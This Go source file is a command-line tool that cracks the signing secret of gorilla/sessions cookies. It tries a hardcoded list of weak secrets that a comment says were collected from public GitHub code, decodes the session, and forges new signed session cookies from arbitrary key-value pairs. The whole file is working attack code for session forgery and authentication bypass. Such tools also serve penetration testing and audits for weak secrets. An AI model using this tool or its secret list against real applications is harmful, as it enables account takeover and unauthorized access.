package main

import (
        "bytes"
        "flag"
        "log"
        "fmt"
        "io"
        "io/ioutil"
        "encoding/base64"
        "encoding/gob"
        "crypto/hmac"
        "crypto/sha256"
        "os"
        "net/http"
        "encoding/json"
        "bufio"
        "github.com/gorilla/sessions"
        "github.com/gorilla/securecookie"
)
func rebuild_session(file, secret, name *string){
        var store = sessions.NewCookieStore([]byte(*secret))
        var reader io.Reader
        var sessionvalues map[string]string
        //Get File
        f, err := os.Open(*file)
        if err != nil{
                log.Fatalf("Unable to open file containing key-value pairs: %s\n", err)
        }
        //Read file contents
        contents, err := ioutil.ReadAll(f)
        if err != nil{
                log.Fatalf("Unable to read file containing key-value pairs: %s\n", err)
        }
        //Turn into json object
        err = json.Unmarshal(contents, &sessionvalues)
        if err != nil {
                log.Fatalf("File containing session key-value pairs must be valid json: %s", err)
        }
        r, _ := http.NewRequest("", "", reader)
        session, _ := store.New(r, *name)
        for i,j := range sessionvalues {
                session.Values[i] = j
        }
        encoded, err := securecookie.EncodeMulti(*name, session.Values,store.Codecs...)
        fmt.Printf("The Session Value is %s\n", encoded) 
}

func attack_session(file, secret, name, sess *string){
        if len(*secret) != 0 {
                default_pws = []string{*secret}
        } else {
                /* Check if a file exists */ 
                if len(*file) != 0 {
                        file , err := os.Open(*file)
                        if err != nil {
                                fmt.Printf("File did not exist %s\n", err)
                                os.Exit(1)
                        }
                        defer file.Close()
                        reader := bufio.NewReader(file)
                        scanner := bufio.NewScanner(reader)
                        for scanner.Scan() {
                                default_pws = append(default_pws,scanner.Text())
                        }
                }
        }
        //Decode and split up first
        sessdec, err := base64.URLEncoding.DecodeString(*sess)
        if err != nil {
                log.Printf("Could not decode session." + err.Error())
        }
        parts := bytes.SplitN(sessdec, []byte("|"), 3)
        if len(parts) != 3 {
                log.Fatalf("Not enough parts. Session might be encrypted")
        }
        for _, j:=range default_pws {
                //Try to verify the mac with whatever arbitrary timestamp
                //Would be easier to still use securecookie and instead fork it
                //and remove the time check
                hm := hmac.New(sha256.New, []byte(j))
                b := append([]byte(*name+"|"), []byte(sessdec[:len(sessdec)-len(parts[2])-1])...)
                hm.Write([]byte(b))
                sum := hm.Sum(nil)
                if bytes.Compare(sum, parts[2]) == 0 {
                        log.Printf("Session Secret Found! It is %s\n", j)
                        desersess(sess);
                        os.Exit(0)
                }
        }
        log.Printf("Session Secret Not Found but we are going to try to deserialize it, in the case it is integrity only.\n")
        desersess(sess);
}
func desersess(sess *string){
        if len(*sess) == 0{
                log.Fatalf("No Session to Deserialize")
        }
        sessdata, err := base64.URLEncoding.DecodeString(*sess)
        if err != nil {
                log.Printf("Could not decode session." + err.Error())
        }
        parts := bytes.SplitN(sessdata, []byte("|"), 3)
        if len(parts) != 3 {
                log.Printf("Invalid Session Data.")
        }
        var contents map[interface{}]interface{}
        dstdecoded := make([]byte, base64.URLEncoding.EncodedLen(len(parts[1])))
        n, err := base64.URLEncoding.Decode(dstdecoded, parts[1])
        if err != nil {
                log.Printf("Could not decode session contents.")
        }
        dec := gob.NewDecoder(bytes.NewBuffer(dstdecoded[:n]))
        if err := dec.Decode(&contents); err != nil {
                log.Printf("Could not deserialize session contents.")
        }
        fmt.Printf("The contents of the session are.\n")
        for i, j := range contents {
                fmt.Printf("\tKey %s -> Value %s\n", i, j)
        }
}
func main(){
        name := flag.String("n", "", "The name of the cookie when constructing or attacking.")
        secret := flag.String("s", "", "Specify a secret to attack, or user a particular secret when reconstructing.")
        sess := flag.String("v", "", "The value of the session string that will be attacked.")
        file := flag.String("f", "", "Json Encoded file containing key value pairs of the session when Reconstructing. File is supplementary list of passwords when attacking.")
        deser := flag.Bool("d", false, "Deserialize if integrity only.")
        rebuild := flag.Bool("r", false, "True if you are reconstructing the session.")
        flag.Parse()

        if *deser {
                desersess(sess)
                os.Exit(0)
        }
        if len(*name) == 0 {
                log.Fatalf("Name must be set to attack or reconstruct a session.\n")
        }

        if *rebuild {
                if len(*file) == 0 {
                        log.Fatalf("JSON File must be set to read key-value pairs into your new session.\n")
                }
                if len(*secret) == 0 {
                        log.Fatalf("Secret password is required to reconstruct a session.\n")
                }
                rebuild_session(file, secret, name)
        } else {
                if len(*sess) == 0 {
                        log.Fatalf("Session value required to attack the session.\n")
                }
                attack_session(file, secret, name, sess)
        }
}

/*
These are passwords I found on the first 30 pages of 
github with a search of "sessions.NewCookieStore([]byte"
It's a damn shame.
*/
var default_pws = []string{
        "auth_token_goes_here",
        "nightdev",
        "todo-change-this",
        "A-Tonga-da-Mironga-do-Kabulete",
        "todo-change-to-secret",
        "secret123",
        "SESSION_SECRET",
        "go-tap-very-secret",
        "secret_words_key_xxx",
        "coffee-maker",
        "auth_token_goes_here",
        "secret-session",
        "no one will guess this passphrase",
        "nonotestetstsst",
        "cookie_secret",
        "status-quo-go",
        "261AD9502C583BD7D8AA03083598653B",
        "youdontknow",
        "Go Game Lobby!",
        "SECRET",
        "",
        "5bf1fd927dfb8679496a2e6cf00cbe50c1c87145",
        "localhost",
        "d8e2f09c-6e37-44a8-a3ec-7a5608b54383",
        "123456789",
        "doughboy",
        "secret-pass",
        "eca7951a-17d7-4bf6-867b-9bd563d8e09b",
        "very-very-secret",
        "NiseGoPostSecret",
        "supersecretkeydelamortquitue",
        "hellogolang.org",
        "mgoAdmin@xuender",
        "324546fa343e8b9067bb412d678a89e83629ffe23940",
        "xuender@gmail.com",
        "sklyar",
        "secret",
        "kjsd2hgi3rez3aeltkxv",
        "GOTLongLiveSessionStore",
        "s3cr3t",
        "something-very-secret",
        "T0PS3CR3T-CHANGEME-PLZ",
}
